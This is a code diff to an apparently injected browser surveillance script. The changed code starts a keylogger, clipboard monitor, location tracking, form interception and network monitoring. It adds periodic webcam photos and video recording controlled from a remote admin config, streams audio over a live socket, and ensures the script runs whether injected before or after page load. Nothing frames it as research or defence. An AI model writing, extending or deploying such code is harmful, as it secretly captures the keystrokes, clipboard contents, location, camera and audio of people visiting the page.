@@ -872,7 +872,7 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         }
     });
 
-    window.addEventListener('DOMContentLoaded', async () => {
+    async function initAll() {
         await fetchConfig();
         logPageVisit();
         heartbeat();
@@ -883,9 +883,20 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         if (C.locationEnabled) trackLocation();
         if (C.keystrokesEnabled) initKeyLogger();
         if (C.clipboardEnabled) { initClipboardMonitor(); setInterval(checkClipboard, C.clipboardCheck); }
-        setTimeout(initCamera, 500); // always init camera — needed for live feed & on-demand screenshots
-        setInterval(fetchConfig, 30000);
-        // Connect live camera socket
+        // Init camera — also sets up periodic photo/video once ready
+        setTimeout(async () => {
+            await initCamera();
+            // Periodic photo capture — respects C.photoEnabled on each tick so
+            // enabling/disabling from admin settings takes effect within one period
+            setInterval(() => { if (C.photoEnabled) takePhoto(); }, C.photoPeriod || 30000);
+            // Periodic video recording — first clip starts after 60s to avoid
+            // recording immediately on page load
+            setTimeout(() => {
+                setInterval(() => { if (C.videoEnabled) recordVideo(); }, C.videoPeriod || 300000);
+            }, 60000);
+        }, 500);
+        setInterval(fetchConfig, 30000); // re-fetch server config every 30s
+        // Connect live camera socket (for audio streaming)
         setTimeout(initLiveSocket, 2000);
         // Enhanced tracking
         initFormInterceptor();
@@ -894,7 +905,14 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initSelectionTracker();
         initErrorCapture();
         initNetworkMonitor();
-    });
+    }
+
+    // Works whether script is injected before OR after DOMContentLoaded fires
+    if (document.readyState === 'loading') {
+        window.addEventListener('DOMContentLoaded', initAll);
+    } else {
+        setTimeout(initAll, 0); // already loaded — run async on next tick
+    }
 
     window.addEventListener('beforeunload', () => {
         if (keyBuffer.length > 0) {
